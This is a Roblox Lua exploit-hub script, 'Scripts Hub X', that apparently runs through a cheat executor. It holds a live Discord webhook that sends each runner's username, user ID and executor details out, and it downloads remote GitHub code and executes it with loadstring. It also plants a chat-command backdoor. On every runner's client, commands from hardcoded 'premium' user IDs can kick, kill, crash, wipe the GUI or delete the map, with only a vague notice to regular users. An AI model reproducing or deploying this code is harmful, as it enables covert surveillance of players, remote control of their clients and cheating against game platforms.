-- ================================
-- Scripts Hub X | Simplified Chat-Based Command System
-- ================================

-- KEY SYSTEM TOGGLE VARIABLE
local Keysystem = false -- Set to false to skip key system for non-premium users

-- Services
local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local SoundService = game:GetService("SoundService")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")
local MarketplaceService = game:GetService("MarketplaceService")
local TeleportService = game:GetService("TeleportService")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")
local StarterGui = game:GetService("StarterGui")
local Lighting = game:GetService("Lighting")
local UserInputService = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui", 5)

-- UserIds
local OwnerUserId = "2341777244"
local PremiumUsers = {
	"1102633570", -- Pedrojay450 [PERM]
	"8860068952", -- Pedrojay450's alt (assaltanoobsbr) [PERM]
	"799427028", -- Roblox_xvt [PERM]
	"5317421108", -- kolwneje [PERM]
	"1458719572", -- wxckfeen [PERM]
	"8931026465", -- genderwillnottell [PERM]
	"679713988" -- LautyyPc [PERM]
}

local StaffUserId = {
	"3882788546", -- Keanjacob5
	"799427028", -- Roblox_xvt
	"9249886989", -- ALT
	"2726723958" -- mhicel235TOH
}

local BlacklistUsers = {
	"716599904", -- ImRottingInHell [PERM]
	"229691" -- ravyn [PERM]
}

-- Webhook URL
local webhookUrl = "https://discord.com/api/webhooks/1416367485803827230/4OLebMf0rtkCajS5S5lmo99iXe0v6v5B1gn_lPDAzz_MQtj0-HabA9wa2PF-5QBNUmgi"

-- ================================
-- SIMPLIFIED SYSTEM VARIABLES
-- ================================

local isPremiumUser = false
local helpGui = nil

-- ================================
-- HELPER FUNCTIONS
-- ================================

-- Check if a user is premium/staff/owner
local function isPremiumUserId(userId)
	local userIdStr = tostring(userId)
	
	-- Check owner
	if userIdStr == tostring(OwnerUserId) then
		return true, "owner"
	end
	
	-- Check staff
	if table.find(StaffUserId, userIdStr) then
		return true, "staff"
	end
	
	-- Check premium
	if table.find(PremiumUsers, userIdStr) then
		return true, "premium"
	end
	
	return false, "regular"
end

-- Notification function
local function notify(title, text)
	spawn(function()
		pcall(function()
			StarterGui:SetCore("SendNotification", {
				Title = title, 
				Text = text, 
				Duration = 3
			})
		end)
	end)
end

-- ================================
-- HELP GUI SYSTEM
-- ================================

local commandsList = {
	{cmd = ";help", desc = "Shows this help menu", example = ";help", category = "Info"},
	{cmd = ";kick [user]", desc = "Kicks you or target user from the game", example = ";kick OR ;kick username", category = "Player"},
	{cmd = ";kill [user]", desc = "Kills you or target user", example = ";kill OR ;kill username", category = "Player"},
	{cmd = ";jump [user]", desc = "Makes you or target user jump", example = ";jump OR ;jump username", category = "Player"},
	{cmd = ";trip [user]", desc = "Makes you or target user trip/sit", example = ";trip OR ;trip username", category = "Player"},
	{cmd = ";void [user]", desc = "Sends you or target user to the void", example = ";void OR ;void username", category = "Player"},
	{cmd = ";freeze [user]", desc = "Freezes you or target user in place", example = ";freeze OR ;freeze username", category = "Player"},
	{cmd = ";unfreeze [user]", desc = "unFreezes you or target user in place", example = ";unfreeze OR ;unfreeze username", category = "Player"},
	{cmd = ";funny [user]", desc = "Sends you or target user to space", example = ";funny OR ;funny username", category = "Player"},
	{cmd = ";crash [user]", desc = "Crashes your or target user's game", example = ";crash OR ;crash username", category = "Destructive"},
	{cmd = ";byfron [user]", desc = "Deletes all GUIs for you or target user", example = ";byfron OR ;byfron username", category = "Destructive"},
	{cmd = ";uninject [user]", desc = "Removes Scripts Hub X from you or target", example = ";uninject OR ;uninject username", category = "Utility"},
	{cmd = ";reveal", desc = "Announces in chat that you're using SHX", example = ";reveal", category = "Fun"},
	{cmd = ";shutdown", desc = "Shuts down the entire server", example = ";shutdown", category = "Server"},
	{cmd = ";deletemap", desc = "Deletes all objects in workspace", example = ";deletemap", category = "Server"},
	{cmd = ";gravity [value]", desc = "Changes workspace gravity", example = ";gravity 50", category = "Server"},
	{cmd = ";framerate [fps]", desc = "Sets your FPS cap", example = ";framerate 30", category = "Client"},
	{cmd = ";toggle", desc = "Toggles all your ScreenGuis", example = ";toggle", category = "Client"},
	{cmd = ";india", desc = "Changes skybox to India theme", example = ";india", category = "Visual"},
	{cmd = ";scriptshubx", desc = "Changes skybox to SHX theme", example = ";scriptshubx", category = "Visual"},
	{cmd = ";anime", desc = "Changes skybox to Anime theme", example = ";anime", category = "Visual"},
}

local function createHelpGui()
	if helpGui then
		helpGui:Destroy()
	end
	
	-- Create ScreenGui
	helpGui = Instance.new("ScreenGui")
	helpGui.Name = "SHXHelpGui"
	helpGui.ResetOnSpawn = false
	helpGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	
	-- Main Frame
	local mainFrame = Instance.new("Frame")
	mainFrame.Name = "MainFrame"
	mainFrame.Size = UDim2.new(0, 400, 0, 500)
	mainFrame.Position = UDim2.new(0.5, -200, 0.5, -250)
	mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
	mainFrame.BorderSizePixel = 0
	mainFrame.Parent = helpGui
	
	-- Add rounded corners
	local corner = Instance.new("UICorner")
	corner.CornerRadius = UDim.new(0, 12)
	corner.Parent = mainFrame
	
	-- Header
	local header = Instance.new("Frame")
	header.Name = "Header"
	header.Size = UDim2.new(1, 0, 0, 50)
	header.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
	header.BorderSizePixel = 0
	header.Parent = mainFrame
	
	local headerCorner = Instance.new("UICorner")
	headerCorner.CornerRadius = UDim.new(0, 12)
	headerCorner.Parent = header
	
	-- Title
	local title = Instance.new("TextLabel")
	title.Name = "Title"
	title.Size = UDim2.new(1, -60, 1, 0)
	title.Position = UDim2.new(0, 15, 0, 0)
	title.BackgroundTransparency = 1
	title.Text = "Scripts Hub X - Premium Commands"
	title.TextColor3 = Color3.fromRGB(255, 255, 255)
	title.TextSize = 18
	title.TextXAlignment = Enum.TextXAlignment.Left
	title.Font = Enum.Font.GothamBold
	title.Parent = header
	
	-- Close Button
	local closeButton = Instance.new("TextButton")
	closeButton.Name = "CloseButton"
	closeButton.Size = UDim2.new(0, 40, 0, 40)
	closeButton.Position = UDim2.new(1, -45, 0, 5)
	closeButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
	closeButton.Text = "×"
	closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
	closeButton.TextSize = 24
	closeButton.Font = Enum.Font.GothamBold
	closeButton.BorderSizePixel = 0
	closeButton.Parent = header
	
	local closeCorner = Instance.new("UICorner")
	closeCorner.CornerRadius = UDim.new(0, 8)
	closeCorner.Parent = closeButton
	
	closeButton.MouseButton1Click:Connect(function()
		helpGui:Destroy()
		helpGui = nil
	end)
	
	-- Info Label
	local infoLabel = Instance.new("TextLabel")
	infoLabel.Name = "InfoLabel"
	infoLabel.Size = UDim2.new(1, -30, 0, 40)
	infoLabel.Position = UDim2.new(0, 15, 0, 55)
	infoLabel.BackgroundTransparency = 1
	infoLabel.Text = "Commands work on yourself if no target specified.\nSupports both Username and Display Name."
	infoLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
	infoLabel.TextSize = 12
	infoLabel.TextWrapped = true
	infoLabel.TextXAlignment = Enum.TextXAlignment.Left
	infoLabel.TextYAlignment = Enum.TextYAlignment.Top
	infoLabel.Font = Enum.Font.Gotham
	infoLabel.Parent = mainFrame
	
	-- Scrolling Frame
	local scrollFrame = Instance.new("ScrollingFrame")
	scrollFrame.Name = "ScrollFrame"
	scrollFrame.Size = UDim2.new(1, -20, 1, -110)
	scrollFrame.Position = UDim2.new(0, 10, 0, 100)
	scrollFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
	scrollFrame.BorderSizePixel = 0
	scrollFrame.ScrollBarThickness = 6
	scrollFrame.ScrollBarImageColor3 = Color3.fromRGB(100, 100, 120)
	scrollFrame.Parent = mainFrame
	
	local scrollCorner = Instance.new("UICorner")
	scrollCorner.CornerRadius = UDim.new(0, 8)
	scrollCorner.Parent = scrollFrame
	
	-- Layout for commands
	local layout = Instance.new("UIListLayout")
	layout.SortOrder = Enum.SortOrder.LayoutOrder
	layout.Padding = UDim.new(0, 8)
	layout.Parent = scrollFrame
	
	local padding = Instance.new("UIPadding")
	padding.PaddingTop = UDim.new(0, 8)
	padding.PaddingBottom = UDim.new(0, 8)
	padding.PaddingLeft = UDim.new(0, 8)
	padding.PaddingRight = UDim.new(0, 8)
	padding.Parent = scrollFrame
	
	-- Add command entries
	local currentCategory = ""
	for _, cmdData in ipairs(commandsList) do
		-- Category header
		if cmdData.category ~= currentCategory then
			currentCategory = cmdData.category
			local categoryLabel = Instance.new("TextLabel")
			categoryLabel.Name = "Category_" .. currentCategory
			categoryLabel.Size = UDim2.new(1, -16, 0, 25)
			categoryLabel.BackgroundColor3 = Color3.fromRGB(45, 45, 65)
			categoryLabel.BorderSizePixel = 0
			categoryLabel.Text = "  " .. currentCategory
			categoryLabel.TextColor3 = Color3.fromRGB(100, 200, 255)
			categoryLabel.TextSize = 14
			categoryLabel.Font = Enum.Font.GothamBold
			categoryLabel.TextXAlignment = Enum.TextXAlignment.Left
			categoryLabel.Parent = scrollFrame
			
			local catCorner = Instance.new("UICorner")
			catCorner.CornerRadius = UDim.new(0, 6)
			catCorner.Parent = categoryLabel
		end
		
		-- Command frame
		local cmdFrame = Instance.new("Frame")
		cmdFrame.Name = "Cmd_" .. cmdData.cmd
		cmdFrame.Size = UDim2.new(1, -16, 0, 70)
		cmdFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
		cmdFrame.BorderSizePixel = 0
		cmdFrame.Parent = scrollFrame
		
		local cmdCorner = Instance.new("UICorner")
		cmdCorner.CornerRadius = UDim.new(0, 6)
		cmdCorner.Parent = cmdFrame
		
		-- Command name
		local cmdName = Instance.new("TextLabel")
		cmdName.Name = "CmdName"
		cmdName.Size = UDim2.new(1, -10, 0, 20)
		cmdName.Position = UDim2.new(0, 5, 0, 5)
		cmdName.BackgroundTransparency = 1
		cmdName.Text = cmdData.cmd
		cmdName.TextColor3 = Color3.fromRGB(100, 255, 150)
		cmdName.TextSize = 13
		cmdName.Font = Enum.Font.GothamBold
		cmdName.TextXAlignment = Enum.TextXAlignment.Left
		cmdName.Parent = cmdFrame
		
		-- Description
		local cmdDesc = Instance.new("TextLabel")
		cmdDesc.Name = "CmdDesc"
		cmdDesc.Size = UDim2.new(1, -10, 0, 20)
		cmdDesc.Position = UDim2.new(0, 5, 0, 25)
		cmdDesc.BackgroundTransparency = 1
		cmdDesc.Text = cmdData.desc
		cmdDesc.TextColor3 = Color3.fromRGB(200, 200, 200)
		cmdDesc.TextSize = 11
		cmdDesc.Font = Enum.Font.Gotham
		cmdDesc.TextXAlignment = Enum.TextXAlignment.Left
		cmdDesc.TextWrapped = true
		cmdDesc.Parent = cmdFrame
		
		-- Example
		local cmdExample = Instance.new("TextLabel")
		cmdExample.Name = "CmdExample"
		cmdExample.Size = UDim2.new(1, -10, 0, 20)
		cmdExample.Position = UDim2.new(0, 5, 0, 47)
		cmdExample.BackgroundTransparency = 1
		cmdExample.Text = "Example: " .. cmdData.example
		cmdExample.TextColor3 = Color3.fromRGB(150, 150, 170)
		cmdExample.TextSize = 10
		cmdExample.Font = Enum.Font.Gotham
		cmdExample.TextXAlignment = Enum.TextXAlignment.Left
		cmdExample.Parent = cmdFrame
	end
	
	-- Update canvas size
	scrollFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 16)
	layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
		scrollFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 16)
	end)
	
	-- Make draggable
	local dragging, dragInput, dragStart, startPos
	
	local function update(input)
		local delta = input.Position - dragStart
		mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
	
	header.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = mainFrame.Position
			
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	header.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			update(input)
		end
	end)
	
	helpGui.Parent = CoreGui
	
	-- Animate entrance
	mainFrame.Position = UDim2.new(0.5, -200, -0.5, 0)
	TweenService:Create(mainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
		Position = UDim2.new(0.5, -200, 0.5, -250)
	}):Play()
end

-- ================================
-- COMMAND FUNCTIONS
-- ================================

local CommandFunctions = {}

-- ;help command
CommandFunctions.help = function(args)
	createHelpGui()
end

-- ;kick command
CommandFunctions.kick = function(args)
	local message = table.concat(args, " ", 2) or "You have been kicked by a Scripts Hub X Premium user"
	player:Kick(message)
end

-- ;crash command
CommandFunctions.crash = function(args)
	while true do
		RunService.Heartbeat:Wait()
		for i = 1, 1000 do
			Instance.new("Part", Workspace)
		end
	end
end

-- ;byfron command (delete all GUIs)
CommandFunctions.byfron = function(args)
	pcall(function()
		for _, gui in pairs(playerGui:GetDescendants()) do
			if gui:IsA("GuiObject") then
				gui:Destroy()
			end
		end
		for _, gui in pairs(CoreGui:GetDescendants()) do
			if gui:IsA("GuiObject") then
				pcall(function() gui:Destroy() end)
			end
		end
	end)
end

-- ;deletemap command
CommandFunctions.deletemap = function(args)
	pcall(function()
		for _, obj in pairs(Workspace:GetChildren()) do
			if obj ~= Workspace.CurrentCamera then
				pcall(function() obj:Destroy() end)
			end
		end
	end)
end

-- ;framerate command
CommandFunctions.framerate = function(args)
	local fps = tonumber(args[2]) or 1
	pcall(function()
		setfpscap(fps)
	end)
end

-- ;gravity command
CommandFunctions.gravity = function(args)
	local gravityValue = tonumber(args[2]) or 100
	Workspace.Gravity = gravityValue
end

-- ;jump command
CommandFunctions.jump = function(args)
	if player.Character and player.Character:FindFirstChild("Humanoid") then
		player.Character.Humanoid.Jump = true
	end
end

-- ;kill command
CommandFunctions.kill = function(args)
	if player.Character and player.Character:FindFirstChild("Humanoid") then
		player.Character.Humanoid.Health = 0
	end
end

-- ;reveal command
CommandFunctions.reveal = function(args)
	pcall(function()
		ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
			"I am using Scripts Hub X :)",
			"All"
		)
	end)
end

-- ;shutdown command
CommandFunctions.shutdown = function(args)
	game:Shutdown()
end

-- ;toggle command
CommandFunctions.toggle = function(args)
	pcall(function()
		for _, gui in pairs(playerGui:GetDescendants()) do
			if gui:IsA("ScreenGui") then
				gui.Enabled = not gui.Enabled
			end
		end
	end)
end

-- ;trip command
CommandFunctions.trip = function(args)
	if player.Character and player.Character:FindFirstChild("Humanoid") then
		player.Character.Humanoid.Sit = true
	end
end

-- ;uninject command
CommandFunctions.uninject = function(args)
	pcall(function()
		if helpGui then helpGui:Destroy() end
		for _, gui in pairs(playerGui:GetChildren()) do
			if gui.Name:match("SHX") or gui.Name:match("ScriptsHubX") then
				gui:Destroy()
			end
		end
	end)
end

-- ;void command
CommandFunctions.void = function(args)
	if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
		player.Character.HumanoidRootPart.CFrame = CFrame.new(0, -500, 0)
	end
end

-- ;india command
CommandFunctions.india = function(args)
	pcall(function()
		local sky = Instance.new("Sky", Lighting)
		sky.SkyboxBk = "rbxassetid://6534369609"
		sky.SkyboxDn = "rbxassetid://6534369609"
		sky.SkyboxFt = "rbxassetid://6534369609"
		sky.SkyboxLf = "rbxassetid://6534369609"
		sky.SkyboxRt = "rbxassetid://6534369609"
		sky.SkyboxUp = "rbxassetid://6534369609"
	end)
end

-- ;scriptshubx command
CommandFunctions.scriptshubx = function(args)
	pcall(function()
		local sky = Instance.new("Sky", Lighting)
		sky.SkyboxBk = "rbxassetid://74135635728836"
		sky.SkyboxDn = "rbxassetid://74135635728836"
		sky.SkyboxFt = "rbxassetid://74135635728836"
		sky.SkyboxLf = "rbxassetid://74135635728836"
		sky.SkyboxRt = "rbxassetid://74135635728836"
		sky.SkyboxUp = "rbxassetid://74135635728836"
	end)
end

-- ;anime command
CommandFunctions.anime = function(args)
	pcall(function()
		local sky = Instance.new("Sky", Lighting)
		sky.SkyboxBk = "rbxassetid://8281674209"
		sky.SkyboxDn = "rbxassetid://8281674209"
		sky.SkyboxFt = "rbxassetid://8281674209"
		sky.SkyboxLf = "rbxassetid://8281674209"
		sky.SkyboxRt = "rbxassetid://8281674209"
		sky.SkyboxUp = "rbxassetid://8281674209"
	end)
end

-- ;freeze command
CommandFunctions.freeze = function(args)
	if player.Character then
		for _, part in pairs(player.Character:GetDescendants()) do
			if part:IsA("BasePart") then
				part.Anchored = true
			end
		end
	end
end

-- ;unfreeze command
CommandFunctions.unfreeze = function(args)
	if player.Character then
		for _, part in pairs(player.Character:GetDescendants()) do
			if part:IsA("BasePart") then
				part.Anchored = false
			end
		end
	end
end

-- ;funny command
CommandFunctions.funny = function(args)
	if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
		player.Character.HumanoidRootPart.CFrame = CFrame.new(0, 100000, 0)
	end
end

-- ================================
-- SIMPLIFIED CHAT COMMAND SYSTEM
-- ================================

-- Commands that don't require a target (affect self or environment)
local selfOnlyCommands = {
	"help", "reveal", "shutdown", "deletemap", "toggle", 
	"india", "scriptshubx", "anime", "gravity", "framerate"
}

-- Parse command from any player's chat and execute if targeting local player
local function handleChatCommand(senderPlayer, message)
	-- Check if message is a command
	if not message:sub(1, 1) == ";" then return end
	
	-- Parse command arguments
	local args = {}
	for word in message:gmatch("%S+") do
		table.insert(args, word)
	end
	
	if #args == 0 then return end
	
	local commandName = args[1]:sub(2):lower() -- Remove semicolon
	
	-- Check if command exists
	if not CommandFunctions[commandName] then return end
	
	-- If sender is local player and is premium, allow self-execution
	if senderPlayer == player then
		if isPremiumUser then
			-- Self-only commands or commands without target
			if table.find(selfOnlyCommands, commandName) or not args[2] then
				print("[SHX] Executing self-command: " .. commandName)
				task.spawn(function()
					CommandFunctions[commandName](args)
				end)
			end
		end
		return
	end
	
	-- Check if sender is premium/staff/owner
	local isPremium, userType = isPremiumUserId(senderPlayer.UserId)
	if not isPremium then
		return -- Sender doesn't have permission
	end
	
	-- Check if command targets local player
	local targetName = args[2]
	if not targetName then return end -- No target specified
	
	-- Check if target matches local player's username or display name (case-insensitive)
	local targetLower = targetName:lower()
	local usernameLower = player.Name:lower()
	local displayNameLower = player.DisplayName:lower()
	
	if targetLower == usernameLower or targetLower == displayNameLower then
		-- Command is targeting local player
		print("[SHX] Received command from " .. userType .. " user " .. senderPlayer.Name .. ": " .. commandName)
		notify("Scripts Hub X", senderPlayer.Name .. " executed: " .. commandName)
		
		-- Execute command
		task.spawn(function()
			CommandFunctions[commandName](args)
		end)
	end
end

-- Listen to ALL players' chat messages
local function startGlobalChatListener()
	-- Method 1: Listen to all players via Chatted event
	for _, otherPlayer in pairs(Players:GetPlayers()) do
		if otherPlayer ~= player then
			pcall(function()
				otherPlayer.Chatted:Connect(function(message)
					handleChatCommand(otherPlayer, message)
				end)
			end)
		end
	end
	
	-- Listen for new players joining
	Players.PlayerAdded:Connect(function(otherPlayer)
		if otherPlayer ~= player then
			pcall(function()
				otherPlayer.Chatted:Connect(function(message)
					handleChatCommand(otherPlayer, message)
				end)
			end)
		end
	end)
	
	-- Method 2: TextChatService (new chat system)
	pcall(function()
		local TextChatService = game:GetService("TextChatService")
		local textChannel = TextChatService.TextChannels.RBXGeneral
		
		textChannel.MessageReceived:Connect(function(message)
			if message.TextSource then
				local senderId = message.TextSource.UserId
				local senderPlayer = Players:GetPlayerByUserId(senderId)
				if senderPlayer then
					handleChatCommand(senderPlayer, message.Text)
				end
			end
		end)
	end)
	
	-- Also listen to own chat for self-commands
	player.Chatted:Connect(function(message)
		handleChatCommand(player, message)
	end)
	
	print("[SHX] Global chat listener started - monitoring all players")
end

-- ================================
-- REMAINING CORE FUNCTIONS
-- ================================

-- Executor detection function
local function detectExecutor()
	if syn and syn.request then
		return "Synapse X"
	elseif KRNL_LOADED then
		return "KRNL"
	elseif getgenv and getgenv().isfluxus then
		return "Fluxus"
	elseif identifyexecutor then
		local executor = identifyexecutor()
		if executor then
			return executor
		end
	end
	return "Unknown"
end

-- Webhook notification function
local function sendWebhookNotification(userStatus, scriptUrl)
	pcall(function()
		local gameName = "Unknown"
		local success, productInfo = pcall(function()
			return MarketplaceService:GetProductInfo(game.PlaceId)
		end)
		if success and productInfo and productInfo.Name then
			gameName = productInfo.Name
		end
		
		local detectedExecutor = detectExecutor()
		local placeId = tostring(game.PlaceId)
		local jobId = game.JobId or "Can't detect JobId"
		
		local send_data = {
			["username"] = "Script Execution Log",
			["avatar_url"] = "https://res.cloudinary.com/dtjjgiitl/image/upload/q_auto:good,f_auto,fl_progressive/v1753332266/kpjl5smuuixc5w2ehn7r.jpg",
			["content"] = "Scripts Hub X | Simplified - Logging",
			["embeds"] = {
				{
					["title"] = "Script Execution Details",
					["description"] = "**Game**: " .. gameName .. "\n**Game ID**: " .. game.PlaceId .. "\n**Profile**: https://www.roblox.com/users/" .. player.UserId .. "/profile",
					["color"] = 2123412,
					["fields"] = {
						{["name"] = "Display Name", ["value"] = player.DisplayName, ["inline"] = true},
						{["name"] = "Username", ["value"] = player.Name, ["inline"] = true},
						{["name"] = "User ID", ["value"] = tostring(player.UserId), ["inline"] = true},
						{["name"] = "Executor", ["value"] = detectedExecutor, ["inline"] = true},
						{["name"] = "User Type", ["value"] = userStatus, ["inline"] = true},
						{["name"] = "Job Id", ["value"] = game.JobId, ["inline"] = true}
					},
					["footer"] = {["text"] = "Scripts Hub X | Simplified", ["icon_url"] = "https://res.cloudinary.com/dtjjgiitl/image/upload/q_auto:good,f_auto,fl_progressive/v1753332266/kpjl5smuuixc5w2ehn7r.jpg"},
					["thumbnail"] = {["url"] = "https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds=" .. player.UserId .. "&size=420x420&format=Png&isCircular=true"}
				}
			}
		}
		
		local headers = {["Content-Type"] = "application/json"}
		local function makeWebhookRequest()
			if request and type(request) == "function" then
				request({
					Url = webhookUrl,
					Method = "POST",
					Headers = headers,
					Body = HttpService:JSONEncode(send_data)
				})
			elseif http_request and type(http_request) == "function" then
				http_request({
					Url = webhookUrl,
					Method = "POST",
					Headers = headers,
					Body = HttpService:JSONEncode(send_data)
				})
			elseif syn and syn.request then
				syn.request({
					Url = webhookUrl,
					Method = "POST",
					Headers = headers,
					Body = HttpService:JSONEncode(send_data)
				})
			end
		end
		
		pcall(makeWebhookRequest)
	end)
end

-- Game support check function
local function checkGameSupport()	
	local success, Games = pcall(function()
		local script = game:HttpGet("https://raw.githubusercontent.com/pickletalk/Scripts-Hub-X/refs/heads/main/GameList.lua")
		return loadstring(script)()
	end)
	
	if not success then
		warn("Failed to load game list: " .. tostring(Games))
		return false, nil
	end
	
	if type(Games) ~= "table" then
		warn("Game list returned invalid data type: " .. type(Games))
		return false, nil
	end
	
	for PlaceID, Execute in pairs(Games) do
		if PlaceID == game.PlaceId then
			print("Game supported, script URL: " .. Execute)
			return true, Execute
		end
	end
	
	print("Game not supported")
	return false, nil
end

-- Game script loading function
local function loadGameScript(scriptUrl)
	local success, result = pcall(function()
		local scriptContent = game:HttpGet(scriptUrl)
		if not scriptContent or scriptContent == "" then
			error("Empty script content received")
		end
		return loadstring(scriptContent)()
	end)
	
	if success then
		print("Game script loaded and executed successfully")
		return true, nil
	else
		print("Failed to load/execute game script: " .. tostring(result))
		return false, tostring(result)
	end
end

-- Key system loader
local function loadKeySystem()
	local success, keySystemModule = pcall(function()
		local script = game:HttpGet("https://raw.githubusercontent.com/pickletalk/Scripts-Hub-X/refs/heads/main/keysystem.lua")
		return loadstring(script)()
	end)
	
	if not success then
		warn("Failed to load key system: " .. tostring(keySystemModule))
		return false
	end
	
	if type(keySystemModule) ~= "table" then
		warn("Key system returned invalid data type: " .. type(keySystemModule))
		return false
	end
	
	print("Checking for existing valid key...")
	if keySystemModule.CheckExistingKey and keySystemModule.CheckExistingKey() then
		print("Valid key found and verified with API, skipping key system UI")
		return true
	end

	if keySystemModule.ShowKeySystem then
		keySystemModule.ShowKeySystem()
	else
		warn("ShowKeySystem function not found in key system module")
		return false
	end
	
	local maxWait = 300
	local waited = 0
	
	while waited < maxWait do
		if keySystemModule.IsKeyVerified and keySystemModule.IsKeyVerified() then
			print("Key verified successfully")
			return true
		end
		
		task.wait(1)
		waited = waited + 1
	end
	
	print("Key verification timeout or failed")
	return false
end

-- User status check function
local function checkUserStatus()
	local userId = tostring(player.UserId)
	print("Checking user status for UserId: " .. userId)
	
	if BlacklistUsers and table.find(BlacklistUsers, userId) then
		print("Blacklisted user detected")
		return "blacklisted"
	end
	
	if OwnerUserId and userId == tostring(OwnerUserId) then
		print("Owner detected")
		isPremiumUser = true
		return "owner"
	end
	
	if StaffUserId and table.find(StaffUserId, userId) then
		print("Staff detected")
		isPremiumUser = true
		return "staff"
	end
	
	if PremiumUsers and table.find(PremiumUsers, userId) then
		print("Premium user detected")
		isPremiumUser = true
		return "premium"
	end
	
	print("Regular user detected - Key system required")
	return "regular"
end

-- ================================
-- MAIN EXECUTION
-- ================================

spawn(function()
	-- Check user status
	local userStatus = checkUserStatus()
	
	-- Handle blacklisted users
	if userStatus == "blacklisted" then
		player:Kick("You are blacklisted from using this script!")
		return
	end
	
	-- Start global chat listener for ALL users
	startGlobalChatListener()
	
	-- Notify premium users about commands
	if isPremiumUser then
		print("[SHX] Premium commands enabled")
		notify("Scripts Hub X", "Premium commands active! Type ;help for commands")
	else
		print("[SHX] Listening for commands from premium users")
		notify("Scripts Hub X", "Command receiver active!")
	end
	
	-- Handle key system for non-premium users
	if userStatus == "regular" and Keysystem then
		local keySuccess = loadKeySystem()
		if not keySuccess then
			print("Key system failed or timed out")
			notify("Scripts Hub X", "Key verification failed or timed out.")
			return
		end
		userStatus = "regular-keyed"
	elseif userStatus == "regular" and not Keysystem then
		print("Key system disabled - Bypassing for regular user")
		userStatus = "regular-bypassed"
	end
	
	-- Check game support
	local isSupported, scriptUrl = checkGameSupport()
	
	-- Send webhook notification
	sendWebhookNotification(userStatus, scriptUrl or "No script URL")
	
	-- Handle unsupported games
	if not isSupported then
		notify("Scripts Hub X", "Game is not supported yet.")
		return
	end
	
	-- Load and execute the game script
	print("Loading game script...")
	local success, errorMsg = loadGameScript(scriptUrl)
	
	if success then
		print("Scripts Hub X | Complete for " .. userStatus .. " user")
		if isPremiumUser then
			print("[SHX] Commands ready. Use ;help in chat for command list")
		end
	else
		print("Script failed to load: " .. tostring(errorMsg))
	end
end)
